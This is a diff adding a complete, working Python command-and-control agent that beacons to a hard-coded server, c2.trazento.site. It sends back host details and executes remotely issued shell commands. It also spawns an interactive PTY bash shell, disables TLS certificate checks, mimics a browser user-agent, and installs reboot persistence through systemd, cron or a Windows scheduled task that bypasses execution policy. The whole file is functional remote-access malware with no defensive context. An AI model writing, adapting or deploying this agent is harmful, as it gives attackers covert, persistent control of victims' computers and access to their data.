@@ -1,0 +1,420 @@
+#!/usr/bin/env python3
+"""
+C2 Agent - standalone, zero deps, PTY shell, cross-platform, reboot survival
+"""
+import base64
+import hashlib
+import hmac
+import json
+import os
+import platform
+import select
+import signal
+import socket
+import subprocess
+import sys
+import threading
+import time
+import urllib.request
+import urllib.error
+
+SERVER = "https://c2.trazento.site"
+AID = None
+KEY = None
+UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
+INTERVAL = 5
+
+# ─── PTY shell state ─────────────────────────────────────────────────
+SH_FD = None
+SH_PID = None
+SH_BUF = []
+SH_LOCK = threading.Lock()
+
+# ─── crypto (stdlib only) ───────────────────────────────────────────
+def _expand(secret, iv, n):
+    k = hmac.new(secret, iv, hashlib.sha256).digest()
+    out = b""
+    for i in range(n):
+        out += hmac.new(k, str(i).encode(), hashlib.sha256).digest()
+    return out[:n]
+
+def encrypt(plain, key=None):
+    k = key or KEY
+    iv = os.urandom(16)
+    p = plain.encode() if isinstance(plain, str) else plain
+    ct = bytes(a ^ b for a, b in zip(p, _expand(k, iv, len(p))))
+    tag = hmac.new(k, iv + ct, hashlib.sha256).digest()[:8]
+    return base64.b64encode(iv + ct + tag).decode()
+
+def decrypt(data, key=None):
+    k = key or KEY
+    raw = base64.b64decode(data.encode())
+    iv, ct, tag = raw[:16], raw[16:-8], raw[-8:]
+    expected = hmac.new(k, iv + ct, hashlib.sha256).digest()[:8]
+    if not hmac.compare_digest(tag, expected):
+        raise ValueError("bad tag")
+    p = bytes(a ^ b for a, b in zip(ct, _expand(k, iv, len(ct))))
+    return p.decode()
+
+# ─── network ─────────────────────────────────────────────────────────
+def _req(url, data):
+    body = json.dumps(data).encode() if data else None
+    hdrs = {"Content-Type": "application/json", "User-Agent": UA}
+    return urllib.request.Request(url, data=body, headers=hdrs)
+
+def _open(req, ssl_ok):
+    try:
+        if ssl_ok:
+            import ssl as _s
+            ctx = _s.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = _s.CERT_NONE
+            return urllib.request.urlopen(req, context=ctx, timeout=10)
+        return urllib.request.urlopen(req, timeout=10)
+    except Exception:
+        return None
+
+def sync_key(resp):
+    if resp and "key" in resp:
+        global KEY
+        KEY = base64.b64decode(resp["key"].encode())
+
+def api(url, data=None):
+    try:
+        r = _open(_req(url, data), True)
+        if r:
+            resp = json.loads(r.read().decode())
+            sync_key(resp)
+            return resp
+    except Exception:
+        pass
+    try:
+        u = url.replace("https://", "http://")
+        r = _open(_req(u, data), False)
+        if r:
+            resp = json.loads(r.read().decode())
+            sync_key(resp)
+            return resp
+    except Exception:
+        pass
+    return None
+
+# ─── PTY shell ──────────────────────────────────────────────────────
+def shell_start():
+    global SH_FD, SH_PID
+    import pty
+    pid, fd = pty.fork()
+    if pid == 0:
+        os.environ["TERM"] = "xterm-256color"
+        os.execvp("/bin/bash", ["/bin/bash", "-i"])
+    SH_FD = fd
+    SH_PID = pid
+
+    def reader():
+        while True:
+            try:
+                r, _, _ = select.select([SH_FD], [], [], 0.5)
+                if r:
+                    data = os.read(SH_FD, 4096)
+                    if not data:
+                        break
+                    with SH_LOCK:
+                        SH_BUF.append(data)
+            except (ValueError, OSError):
+                break
+            except Exception:
+                break
+
+    t = threading.Thread(target=reader, daemon=True)
+    t.start()
+
+def shell_write(text):
+    if SH_FD is not None:
+        os.write(SH_FD, text.encode())
+
+def shell_flush():
+    with SH_LOCK:
+        if not SH_BUF:
+            return ""
+        out = b"".join(SH_BUF)
+        SH_BUF.clear()
+    try:
+        return out.decode(errors="replace")
+    except Exception:
+        return ""
+
+def shell_resize(cols=80, rows=24):
+    if SH_FD is not None:
+        import struct, fcntl, termios
+        s = struct.pack("HHHH", rows, cols, 0, 0)
+        fcntl.ioctl(SH_FD, termios.TIOCSWINSZ, s)
+
+def shell_stop():
+    global SH_FD, SH_PID
+    if SH_PID:
+        try:
+            os.kill(SH_PID, signal.SIGTERM)
+            os.waitpid(SH_PID, 0)
+        except Exception:
+            pass
+    if SH_FD is not None:
+        try:
+            os.close(SH_FD)
+        except Exception:
+            pass
+    SH_FD = None
+    SH_PID = None
+
+# ─── core ────────────────────────────────────────────────────────────
+def get_key():
+    global KEY
+    r = api(f"{SERVER}/api/key")
+    if r and "key" in r:
+        KEY = base64.b64decode(r["key"].encode())
+        return True
+    return False
+
+def register():
+    global AID
+    info = {
+        "hostname": socket.gethostname(),
+        "user": os.environ.get("USER", "?"),
+        "os": f"{platform.system()} {platform.release()}"
+    }
+    r = api(f"{SERVER}/api/login", {"cipher": encrypt(json.dumps(info))})
+    if r and "agent_id" in r:
+        AID = r["agent_id"]
+        return r.get("interval", 5)
+    return 5
+
+def send_result(data):
+    return api(f"{SERVER}/api/tasks/{AID}", {"cipher": encrypt(json.dumps(data))})
+
+def poll():
+    r = api(f"{SERVER}/api/tasks/{AID}")
+    if r:
+        return r.get("tasks", []), r.get("interval", 5), r.get("known", True)
+    return [], 5, False
+
+def exec_shell(cmd):
+    try:
+        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
+        return {"stdout": res.stdout, "stderr": res.stderr, "code": res.returncode}
+    except subprocess.TimeoutExpired:
+        return {"stdout": "", "stderr": "TIMEOUT", "code": -1}
+    except Exception as ex:
+        return {"stdout": "", "stderr": str(ex), "code": -1}
+
+def do_task(t):
+    typ, pay = t.get("type", ""), t.get("payload", "")
+    tid = t.get("id", 0)
+    res = {"task_id": tid, "status": "done", "output": {}}
+
+    if typ == "shell":
+        res["output"] = exec_shell(pay)
+
+    elif typ == "shell_start":
+        if SH_FD is None:
+            try:
+                shell_start()
+                res["output"] = {"stdout": "shell started", "stderr": "", "code": 0}
+            except Exception as e:
+                res["output"] = {"stdout": "", "stderr": f"shell start fail: {e}", "code": -1}
+        else:
+            res["output"] = {"stdout": "shell already running", "stderr": "", "code": 0}
+
+    elif typ == "shell_input":
+        if SH_FD is not None:
+            shell_write(pay)
+            res["output"] = {"stdout": "", "stderr": "", "code": 0}
+        else:
+            res["output"] = {"stdout": "", "stderr": "no shell", "code": -1}
+
+    elif typ == "shell_resize":
+        try:
+            parts = pay.split("x")
+            cols, rows = int(parts[0]), int(parts[1])
+            shell_resize(cols, rows)
+            res["output"] = {"stdout": f"resized {cols}x{rows}", "stderr": "", "code": 0}
+        except Exception as e:
+            res["output"] = {"stdout": "", "stderr": str(e), "code": -1}
+
+    elif typ == "shell_stop":
+        shell_stop()
+        res["output"] = {"stdout": "shell stopped", "stderr": "", "code": 0}
+
+    elif typ == "sleep":
+        try:
+            time.sleep(int(pay))
+        except Exception:
+            pass
+        res["output"] = {"stdout": f"slept {pay}s", "stderr": "", "code": 0}
+
+    elif typ == "exit":
+        res["output"] = {"stdout": "exiting", "stderr": "", "code": 0}
+        send_result(res)
+        shell_stop()
+        os._exit(0)
+
+    else:
+        res["output"] = {"stdout": f"unknown type: {typ}", "stderr": "", "code": -1}
+
+    return res
+
+# ─── persistence ─────────────────────────────────────────────────────
+SERVICE_TEMPLATE = """[Unit]
+Description=C2 Agent
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={python} {agent} --server {server}
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+"""
+
+def install_persistence():
+    agent_path = os.path.abspath(sys.argv[0])
+    srv = SERVER
+    is_win = platform.system() == "Windows"
+
+    if not is_win:
+        svc = SERVICE_TEMPLATE.format(python=sys.executable, agent=agent_path, server=srv)
+        local_path = os.path.join(os.path.dirname(agent_path), "c2-agent.service")
+        with open(local_path, "w") as f:
+            f.write(svc)
+        print(f"[*] systemd file: {local_path}")
+        try:
+            subprocess.run(["sudo", "-n", "cp", local_path, "/etc/systemd/system/c2-agent.service"],
+                           capture_output=True, check=True)
+            subprocess.run(["sudo", "-n", "systemctl", "daemon-reload"], capture_output=True, check=True)
+            subprocess.run(["sudo", "-n", "systemctl", "enable", "c2-agent"], capture_output=True, check=True)
+            subprocess.run(["sudo", "-n", "systemctl", "start", "c2-agent"], capture_output=True, check=True)
+            print("[+] systemd installed")
+            return
+        except Exception:
+            print("[!] no passwordless sudo")
+            print(f"    sudo cp {local_path} /etc/systemd/system/c2-agent.service")
+            print(f"    sudo systemctl daemon-reload && sudo systemctl enable c2-agent && sudo systemctl start c2-agent")
+
+        cron = f"@reboot {sys.executable} {agent_path} --server {srv} &"
+        try:
+            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True, check=True)
+            print("[+] crontab installed")
+            return
+        except Exception as e:
+            print(f"[!] crontab fail: {e}")
+    else:
+        ps = (
+            '$action = New-ScheduledTaskAction -Execute ' + "'" + sys.executable + "'" +
+            " -Argument '" + agent_path + " --server " + srv + "'\n"
+            '$trigger = New-ScheduledTaskTrigger -AtStartup\n'
+            'Register-ScheduledTask -TaskName C2Agent -Action $action -Trigger $trigger -Force\n'
+        )
+        try:
+            tf = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "install_c2.ps1")
+            with open(tf, "w") as f:
+                f.write(ps)
+            subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", tf], check=True)
+            os.unlink(tf)
+            print("[+] Windows scheduled task installed")
+        except Exception as e:
+            print(f"[!] Windows install fail: {e}")
+
+def remove_persistence():
+    if platform.system() != "Windows":
+        try:
+            subprocess.run("crontab -l 2>/dev/null | grep -v c2_agent | crontab -", shell=True, check=True)
+            print("[+] crontab removed")
+        except Exception:
+            pass
+        try:
+            subprocess.run(["sudo", "-n", "systemctl", "stop", "c2-agent"], capture_output=True)
+            subprocess.run(["sudo", "-n", "systemctl", "disable", "c2-agent"], capture_output=True)
+        except Exception:
+            pass
+    else:
+        try:
+            subprocess.run(["schtasks", "/delete", "/tn", "C2Agent", "/f"], capture_output=True)
+            print("[+] Windows task removed")
+        except Exception:
+            pass
+
+# ─── main ────────────────────────────────────────────────────────────
+def main():
+    global SERVER, INTERVAL
+    want_install = False
+    want_remove = False
+
+    i = 1
+    while i < len(sys.argv):
+        a = sys.argv[i]
+        if a == "--server" and i + 1 < len(sys.argv):
+            SERVER = sys.argv[i + 1]; i += 2
+        elif a == "--install":
+            want_install = True; i += 1
+        elif a == "--remove":
+            want_remove = True; i += 1
+        elif a.startswith("http"):
+            SERVER = a; i += 1
+        else:
+            i += 1
+
+    if want_install:
+        install_persistence(); return
+    if want_remove:
+        remove_persistence(); return
+
+    print(f"[agent] {SERVER}")
+    if not get_key():
+        print("[agent] key fail"); return
+    INTERVAL = register()
+    if not AID:
+        print("[agent] register fail"); return
+    print(f"[agent] id={AID} interval={INTERVAL}s")
+
+    poll_count = 0
+    while True:
+        # flush PTY output if shell active
+        if SH_FD is not None:
+            so = shell_flush()
+            if so:
+                send_result({"task_id": -1, "type": "shell_output", "output": {"stdout": so, "stderr": "", "code": 0}})
+
+        # poll for tasks
+        tasks, ni, known = poll()
+        if ni:
+            INTERVAL = ni
+
+        # re-register if server doesn't know our AID (server restarted)
+        if not known:
+            get_key()
+            INTERVAL = register()
+            if not AID:
+                print("[agent] re-register fail")
+        else:
+            pass  # server knows us, normal operation
+
+        # active shell mode: poll faster
+        sleep_time = INTERVAL
+        for t in tasks:
+            r = do_task(t)
+            send_result(r)
+            if t.get("type") == "exit":
+                shell_stop()
+                return
+            if t.get("type") in ("shell_start", "shell_input", "shell_stop", "shell_resize"):
+                sleep_time = 0.5
+
+        # if shell active, poll faster
+        if SH_FD is not None:
+            sleep_time = 0.5
+
+        time.sleep(sleep_time)
+        poll_count += 1
+
+if __name__ == "__main__":
+    main()
